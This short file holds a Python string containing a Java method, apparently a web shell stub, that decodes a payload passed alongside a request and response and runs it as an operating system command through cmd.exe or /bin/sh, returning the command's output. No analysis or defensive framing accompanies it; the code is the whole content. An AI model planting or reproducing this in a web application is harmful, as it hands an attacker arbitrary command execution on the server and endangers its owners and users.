code = """
    private String stub(String payload, Object request, Object response)
            throws Exception {
        if (payload == null) {
            return null;
        }
        payload = decoder(payload);
        Process process;
        boolean iswin = System.getProperty("os.name").toLowerCase()
                .startsWith("windows");
        if (iswin) {
            process = Runtime.getRuntime().exec(
                    new String[] {"cmd.exe", "/c", payload}
            );
        } else {
            process = Runtime.getRuntime().exec(
                    new String[] {"/bin/sh", "-c", payload}
            );
        }
        Scanner s = new Scanner(process.getInputStream()).useDelimiter("\\\\A");
        String result = s.hasNext()?s.next():"";
        return result;
    }
"""